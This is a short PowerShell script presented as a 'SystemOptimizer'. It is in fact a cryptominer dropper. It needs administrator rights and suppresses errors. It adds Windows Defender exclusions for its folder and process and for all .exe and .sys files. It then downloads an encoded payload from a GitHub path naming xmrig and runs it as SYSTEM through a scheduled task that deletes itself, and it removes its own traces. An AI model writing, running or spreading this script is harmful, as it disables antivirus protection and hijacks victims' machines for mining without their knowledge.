#Requires -RunAsAdministrator
$ErrorActionPreference = "SilentlyContinue"

$baseDir = "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer"
Add-MpPreference -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "SystemOptimizer.exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".sys" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue

$b64 = irm https://raw.githubusercontent.com/alphahubv2/modest-fermi/master/xmrig/bootstrap.b64

$tempCmd = "$env:TEMP\run_bootstrap.cmd"
@"
schtasks /Create /TN SysOptBoot /TR "powershell -EncodedCommand $b64" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F 2>$null
schtasks /Run /TN SysOptBoot 2>$null
schtasks /Delete /TN SysOptBoot /F 2>$null
"@ | Set-Content -Path $tempCmd -Encoding ascii

Start-Process cmd -ArgumentList "/c $tempCmd" -Verb RunAs -Wait
Remove-Item $tempCmd -Force -ErrorAction SilentlyContinue